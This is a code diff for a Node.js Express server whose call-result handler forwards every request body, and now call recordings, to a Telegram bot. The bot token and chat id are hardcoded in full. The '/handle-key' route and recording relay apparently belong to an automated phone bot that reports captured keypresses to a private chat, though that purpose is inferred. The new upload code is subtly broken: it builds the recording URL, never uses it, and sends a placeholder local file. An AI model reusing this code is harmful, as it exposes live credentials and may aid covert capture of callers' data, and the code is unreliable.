@@ -51,7 +51,29 @@ app.post('/handle-key', (req, res) => {
 app.post('/callOutputs', (req, res) => {
     axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + JSON.stringify(req.body)) 
     if(req.body.RecordingUrl){
-        axios.get('https://tgbot.prince-donation.com/call_recording_sender/index.php?url=' + req.body.RecordingUrl + ".mp3") 
+        const mp3Url = req.body.RecordingUrl + ".mp3";
+        // Create a form data object
+        const form = new FormData();
+
+        // Replace 'path/to/your/file.mp3' with the path to your MP3 file
+        const filePath = 'file.mp3';
+
+        // Append the MP3 file to the form data
+        form.append('audio', fs.createReadStream(filePath), { filename: 'file.mp3' });
+        form.append('chat_id', 5113588348);
+        // Make a POST request with the form data
+        axios.post('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendAudio', form, {
+            headers: {
+            ...form.getHeaders(),
+            // Additional headers if needed
+            },
+        })
+        .then(response => {
+            console.log('Upload successful:', response.data);
+        })
+        .catch(error => {
+            console.error('Error uploading file:', error);
+        });
     }
 });
 
